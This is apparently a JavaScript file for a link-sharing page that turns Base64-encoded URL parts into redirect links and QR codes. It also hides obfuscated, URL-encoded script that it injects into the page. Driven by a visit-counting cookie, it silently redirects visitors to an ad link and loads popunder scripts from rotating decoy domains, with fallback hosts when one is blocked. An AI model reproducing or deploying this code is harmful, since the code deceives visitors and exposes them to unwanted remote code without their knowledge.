!function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date);var n=document.createElement("script");n.async=!0,n.src="https://www.googletagmanager.com/gtag/js?id=G-G4QKJ6KM3L",n.onload=function(){a("config","G-G4QKJ6KM3L")},document.head.appendChild(n)}();

var TEST_NUMERIC = /^\d+$/, TEST_ALPHANUMERIC = /^[0-9A-Z$%*+-./: ]+$/;
function chooseBestModeData(data) {
   if (TEST_NUMERIC.test(data)) { return new QRCode.QRNumeric(data); } else if (TEST_ALPHANUMERIC.test(data)) { return new QRCode.QRAlphanumeric(data); }
   try { return new QRCode.QRKanji(data); } catch (error) { return new QRCode.QRByte(data); }
}
	    
	var urlasli = window.location.href.replace('?fbclid=','@').replace(/@.+/,'');
	var kosong = urlasli.replace(/id?=.+/,"id?="); if (urlasli == kosong) {window.location="/404"}
	var takde = kosong.replace('id?=',''); if (urlasli == takde) {window.location="/404"}
	var akh = urlasli.slice(-1); if (akh == "-") {window.location="/404"}
	var dataUrl = urlasli.replace(/.+id?=/,"").split("-");
	console.log(dataUrl);
	var posts = '';   
	for (var i = 0; i < dataUrl.length; i++) {  
	var world = ["void", "first"]; var zones = world[Math.floor(Math.random() * world.length)];	
	var tcoUrl = 'https://'+zones+"realm.imgle.xyz"+'/?code='+Base64.decode(dataUrl[i]).replaceAll('%EF%BF%BD','');

 var data = tcoUrl;
 var mode = 'Auto'; var ecLevel = 'L'; var margin = '5'; var moduleSize = '8'; var hasEncodingHint = false;
 var qrcode = new QRCode.Encoder();
 var errorCorrectionLevel = QRCode.ErrorCorrectionLevel[ecLevel];
 qrcode.setEncodingHint(hasEncodingHint).setErrorCorrectionLevel(errorCorrectionLevel);
 try {
	var data = mode === 'Auto' ? chooseBestModeData(data) : new QRCode[mode](data);
	qrcode.write(data).make();
	var srcimgQR = qrcode.toDataURL(moduleSize, margin); //console.log(srcimgQR);
 } catch (error) { alert(error.message); }	  
 var imgQR = '<img id="srcQR" class="srcQR" src="'+srcimgQR+'"></img>';
	
	var hasil  = '<tr><td>'+imgQR+'</td><td>Link '+(i+1)+' <a href="'+tcoUrl+'">OPEN LINK</a></td></tr>';	
	posts += hasil;	
	}
	var postresult = '<table class="tableresult">'+posts+'</table>';
	if (urlasli != takde) {
	document.getElementById('post').innerHTML = postresult;
	} else {window.location="/404";}

var warnmsg = decodeURIComponent(`%3Cdiv%20style%3D%22text-align%3A%20center%3Bbackground-color%3A%20%23ffb700%3Bborder-radius%3A%205px%3Bmax-width%3A%20418px%3Bdisplay%3A%20flex%3Balign-items%3A%20center%3Bmargin%3A%20auto%3B%22%3EWarning!%20If%20you%20did%20not%20create%20this%20page%2C%20%3Cbr%20%2F%3E%3Ca%20style%3D%22width%3A%2046%25%3Bborder%3A%200%3Bcolor%3A%20darkmagenta%3B%22%20href%3D%22%2F%22%3E%20GOTO%20HOMEPAGE%3C%2Fa%3E%3C%2Fdiv%3E`);
var PpCs = decodeURIComponent(`var%20p%2400a%20%3D%20'p%2400a'%20%2B%20(new%20Date().getTime())%20%2B%20'zz'%3B%20window%5Bp%2400a%5D%20%3D%20%7Ba%3A'abcdefghijklmnopqrstuvwxyz0123456789zf83gdowj1rt6kynu04clmpb9qx2s5ha7iev'%2C%20b%3A'%7B%22AZIb%22%3A%222i7a27%22%2C%20%22BVIb%22%3A%22is2x7a%22%2C%20%22CXrr1%22%3A%22lk3g0%22%2C%20%22DLtag%22%3A%222%22%2C%20%22Emjk5%22%3A%22%22%2C%20%22XCge1s%22%3A%223zn0y.8tyl3%22%20%2C%20%22Zt1%22%3A%22nyn8z4w.kgc%22%2C%20%22ZZ1%22%3A%220znytyr.8y6%22%20%7D'%2C%20c%3A'%7B%22Abkr221%22%3A%22480jnc%22%2C%20%22Bo9ssm%22%3A%22%2F%2F83k.3zn0y.8tyl3%2Fznn.14%22%7D'%2C%20d%3A'%7B%22Ag4%22%3A%22fy39%22%2C%20%22Bx1%22%3A%22znngk3Cwjt3%22%2C%20%22Cky%22%3A%22408%22%2C%20%22Dmg%22%3A%2280gzcgEtg6gkc%22%7D'%7D%3B%0Avar%20_0x5d4b%3D%5B'235913QVfbwv'%2C'slice'%2C'length'%2C'162209QBmAmV'%2C'14238hyOOTq'%2C'323207DTbifh'%2C'split'%2C'1DqiKtq'%2C'135866HTbavB'%2C'indexOf'%2C'call'%2C'27654SKXHbY'%2C'parse'%2C'undefined'%2C'32Ijckmz'%2C'keys'%2C'map'%2C'ceil'%2C'115980hcFVDy'%2C'values'%2C'join'%5D%3Bvar%20_0x208c%3Dfunction(_0x31a8d7%2C_0x5f36b3)%7B_0x31a8d7%3D_0x31a8d7-0x167%3Bvar%20_0x5d4be1%3D_0x5d4b%5B_0x31a8d7%5D%3Breturn%20_0x5d4be1%3B%7D%3B(function(_0x276f94%2C_0x57c4ff)%7Bvar%20_0x50057c%3D_0x208c%3Bwhile(!!%5B%5D)%7Btry%7Bvar%20_0x40d184%3DparseInt(_0x50057c(0x168))%2BparseInt(_0x50057c(0x16f))*parseInt(_0x50057c(0x179))%2B-parseInt(_0x50057c(0x176))%2BparseInt(_0x50057c(0x173))%2BparseInt(_0x50057c(0x16e))%2B-parseInt(_0x50057c(0x170))%2BparseInt(_0x50057c(0x16b))*-parseInt(_0x50057c(0x172))%3Bif(_0x40d184%3D%3D%3D_0x57c4ff)break%3Belse%20_0x276f94%5B'push'%5D(_0x276f94%5B'shift'%5D())%3B%7Dcatch(_0x411836)%7B_0x276f94%5B'push'%5D(_0x276f94%5B'shift'%5D())%3B%7D%7D%7D(_0x5d4b%2C0x45111)%2Cfunction()%7Bvar%20_0x1ba274%3Dfunction(_0x2f3a9a)%7Bvar%20_0x3f0bc4%3D_0x208c%2C_0x1894ba%3DMath%5B_0x3f0bc4(0x167)%5D(this%5B'a'%5D%5B_0x3f0bc4(0x16d)%5D%2F0x2)%2C_0x539548%3Dthis%5B'a'%5D%5B_0x3f0bc4(0x16c)%5D(0x0%2C_0x1894ba)%2C_0x5d8009%3Dthis%5B'a'%5D%5B_0x3f0bc4(0x16c)%5D(_0x1894ba)%3Bdecrypt%3Dthis%5B_0x2f3a9a%5D%5B_0x3f0bc4(0x171)%5D('')%5B_0x3f0bc4(0x17b)%5D(_0x28f433%3D%3E%7Bvar%20_0xd7612d%3D_0x3f0bc4%3Breturn%20_0x5d8009%5B'split'%5D('')%5B'includes'%5D(_0x28f433)%3F_0x539548%5B_0x5d8009%5B_0xd7612d(0x174)%5D(_0x28f433)%5D%3A_0x28f433%3B%7D)%5B_0x3f0bc4(0x16a)%5D('')%3Btry%7Breturn%20JSON%5B_0x3f0bc4(0x177)%5D(decrypt)%3B%7Dcatch%7Breturn%20decrypt%3B%7D%7D%2C_0x57bb85%3Dwindow%5Bp%2400a%5D%2C_0x219d97%3Dfunction(_0x28efac%2C_0x22a031)%7Bvar%20_0x5bee8e%3D_0x208c%2C_0x3963a0%3DObject%5B_0x5bee8e(0x169)%5D(_0x1ba274%5B_0x5bee8e(0x175)%5D(_0x57bb85%2CObject%5B_0x5bee8e(0x17a)%5D(_0x57bb85)%5B_0x28efac%5D))%3Breturn%20typeof%20_0x22a031!%3D_0x5bee8e(0x178)%3F_0x3963a0%5B_0x22a031%5D%3A_0x3963a0%3B%7D%3Bwindow%5Bp%2400a%5D%5B'x'%5D%3Dfunction()%7Breturn%20_0x219d97(0x1)%3B%7D%3Bvar%20_0xf1db57%3Ddocument%5B_0x219d97(0x3%2C0x3)%5D(_0x219d97(0x2%2C0x0))%3B_0xf1db57%5B_0x219d97(0x3%2C0x2)%5D%3D_0x219d97(0x2%2C0x1)%2Cdocument%5B_0x219d97(0x3%2C0x0)%5D%5B_0x219d97(0x3%2C0x1)%5D(_0xf1db57)%2Cp%2400a%3Dundefined%3B%7D())%3B`);
document.addEventListener('DOMContentLoaded', function() {
    function setCookie(cname, cvalue) {
        var d = new Date();
        d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
        var expires = "expires=" + d.toUTCString();
        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
    }

    function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        var ca = decodedCookie.split(';');
        for(var i = 0; i <ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }

    function loadScript() {
        var kjngn = getCookie("kjngn");
        if (kjngn === "") {
            kjngn = 0;
        }
        kjngn = parseInt(kjngn);
        if (kjngn > 10) {
				if (kjngn % 2 !== 0) {
					$('#post-top').append('<scr'+'ipt>'+PpCs+'</scr'+'ipt>');
				}
        } else {
			if (kjngn == 10) {function camAd(){window.location.href="https://s.zlinkb.com/d.php?z=4836662"}setTimeout(camAd,1e3);};
			$('#post-top').append(warnmsg);
				if (kjngn % 2 !== 0) {
					const scrPop = document.createElement('script'), prtkl = 'https://', jspath = '.com/86/ee/38/86ee38bc5153fafce9238da7e86faf19.js';scrPop.type = 'text/javascript';scrPop.src = `${prtkl}cabbagereporterpayroll${jspath}`;var alternateSrcs = ['separationalphabet','foldedprevent','dramamutual'];scrPop.onerror = function() {var randomIndx = Math.floor(Math.random() * alternateSrcs.length);var alternateSrc = prtkl + alternateSrcs[randomIndx] + jspath;scrPop.src = alternateSrc;document.head.appendChild(scrPop);};document.head.appendChild(scrPop);
				}
		}
        kjngn++;
        setCookie("kjngn", kjngn);
    }

    loadScript();
});



